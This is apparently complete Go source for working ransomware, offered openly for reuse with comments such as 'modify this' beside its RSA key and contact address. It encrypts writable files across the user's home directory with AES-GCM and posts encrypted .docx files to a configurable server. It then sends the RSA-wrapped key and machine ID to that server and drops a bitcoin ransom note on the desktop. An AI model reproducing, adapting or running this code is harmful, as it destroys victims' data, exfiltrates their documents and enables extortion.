package main

import (
	"strings"

	"github.com/denisbrodbeck/machineid"

	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/big"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"time"
)

var (
	ToKeep []string = []string{ ".*\\.docx" }
)

type keeper struct {
	filename string
	toSend   bool
}

func fromBase10(base10 string) *big.Int {
    i, ok := new(big.Int).SetString(base10, 10)
    if !ok {
        panic("bad number: " + base10)
    }
    return i
}

var Key rsa.PublicKey

func init() {
    Key = rsa.PublicKey{
        N: fromBase10("28173238234479268692748171777584780950112726971800472303179518822064257035330343535382062519135554178057392050439512475197418759177681714996439478119637798431181217850091954574573450965244968320132378502502291379125779591047483820406235123169703702675102086669837722293492775826594973909630373982606134840347804878462514286834694538401513937386496705419688029997745683837628079207343818814366116867188449488550233959271590182601502875729623298406808420521843821837320643772450775606353905712230611517533654282258147082226740950169620818579409805061640251994478022087950933425934855126618181491816001603975662267491029"), // modify this
        E: 65537,
    }
}

func visit(files *[]keeper) filepath.WalkFunc {
    return func(path string, info os.FileInfo, err error) error {
		var k keeper
        if err != nil {
            log.Fatal(err)
        }

        if info.IsDir() {
            return nil
        }

        ex, err := os.Executable()
        if err != nil {
            panic(err)
        }

        if path == ex {
            return nil
        }

        if filepath.Base(path) == "decrypt.exe" {
            return nil
        }

        if info.Mode().Perm()&(1<<(uint(7))) == 0 { // black magic to check whether we have write permissions.
            return nil
        }

		k.filename = path
        for _, value := range ToKeep {
            if b, _ := regexp.Match(value, []byte(filepath.Base(path))); b {
                k.toSend = true
                break
            } else {
                k.toSend = false
            }
        }

        *files = append(*files, k)
        return nil
    }
}

// NewEncryptionKey generates a random 256-bit key for Encrypt() and
// Decrypt(). It panics if the source of randomness fails.
func NewEncryptionKey() *[32]byte {
    key := [32]byte{}
    _, err := io.ReadFull(rand.Reader, key[:])
    if err != nil {
        panic(err)
    }
    return &key
}

// Encrypt encrypts data using 256-bit AES-GCM.  This both hides the content of
// the data and provides a check that it hasn't been altered. Output takes the
// form nonce|ciphertext|tag where '|' indicates concatenation.
func Encrypt(plaintext []byte, key *[32]byte) (ciphertext []byte, err error) {
    block, err := aes.NewCipher(key[:])
    if err != nil {
        return nil, err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }

    nonce := make([]byte, gcm.NonceSize())
    _, err = io.ReadFull(rand.Reader, nonce)
    if err != nil {
        return nil, err
    }

    return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

type PaymentInfo struct {
    Address string
    Amount  string
}

var server string = "127.0.0.1:4444" // server address
var contact string = "keksec@kek.hq" // whatever address suits you

func main() {
    var files []keeper
    var counter int = 1
    var home string
    var hc http.Client = http.Client{}

    randomKey := NewEncryptionKey()

    if runtime.GOOS == "windows" {
        home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
        if home == "" {
            home = os.Getenv("USERPROFILE")
        }
    } else {
        home = os.Getenv("HOME")
    }

    err := filepath.Walk(home, visit(&files))
    if err != nil {
        panic(err)
    }
    for _, file := range files {
        fmt.Printf("\rEncrypting %d/%d: %s", counter, len(files), file)

        data, err := ioutil.ReadFile(file.filename)
        if err != nil {
            continue
        }

        encrypted, err := Encrypt(data, randomKey)
        if err != nil {
            log.Println(err)
            continue
        }

        err = ioutil.WriteFile(file.filename, encrypted, 0644)
        if err != nil {
            continue
        }

        if file.toSend {
            file, err := os.Open(file.filename)
            if  err != nil {
                panic(err)
            }

            str, err := ioutil.ReadAll(file)
            if err != nil {
                panic(err)
            }

            form := url.Values{}
            form.Add("xxx", string(str))
            req, err := http.NewRequest("POST", "http://" + server, strings.NewReader(form.Encode()))
            if err != nil {
                panic(err)
            }
            req.Header.Add("Content-Type", "application/x-form-url-encode")

            resp, err := hc.Do(req)
            fmt.Println(resp.StatusCode)
        }

        counter++
    }
    fmt.Printf("\n%d files encrypted.\n", len(files))

    encryptedKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &Key, randomKey[:], nil)
    if err != nil {
        log.Fatal(err)
    }
    randomKey = nil // clear key

    id, err := machineid.ID()
    if err != nil {
        log.Fatal(err)
    }
    fmt.Println("Sending key away.")

    for {
        response, err := http.PostForm("http://" + server + "/key/", url.Values{
            "key": {hex.EncodeToString(encryptedKey)},
            "id": {id},
        })
        if err != nil {
            if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
                ioutil.WriteFile("key.txt", []byte(hex.EncodeToString(encryptedKey)), 0644)
            }

            fmt.Println("Connection failed. Retrying in 5 seconds..")
            time.Sleep(5 * time.Second)
            continue
        }
        defer response.Body.Close()
        if _, err := os.Stat("key.txt"); !os.IsNotExist(err) {
            err = os.Remove("key.txt")
            if err != nil {
                log.Fatal(err)
            }
        }
        fmt.Println("Connection established. Payment information received..")

        payment := new(PaymentInfo)

        err = json.NewDecoder(response.Body).Decode(&payment)
        if err != nil {
            log.Fatal(err)
        }
        text := "Your files have been encrypted. Please pay " + payment.Amount + " satoshi to the following bitcoin address if you want to decrypt them: " + payment.Address + " . Use https://www.blockchain.com/btc/address/" + payment.Address + " to check the status of your payment. Once the transaction has 6+ confirmations you can run the decrpytion tool to decrypt your files. If this proccess is unclear to you, please reach out to: " + contact + ". Have a nice day!\nMachine ID: " + id

        if runtime.GOOS == "windows" {
            ioutil.WriteFile(home + "\\Desktop\\README.txt", []byte(text), 0644)
        } else {
            ioutil.WriteFile(home + "/README.txt", []byte(text), 0644)
        }
        fmt.Println("Script execution completed successfully!")

        break
    }

    encryptedKey = nil
}
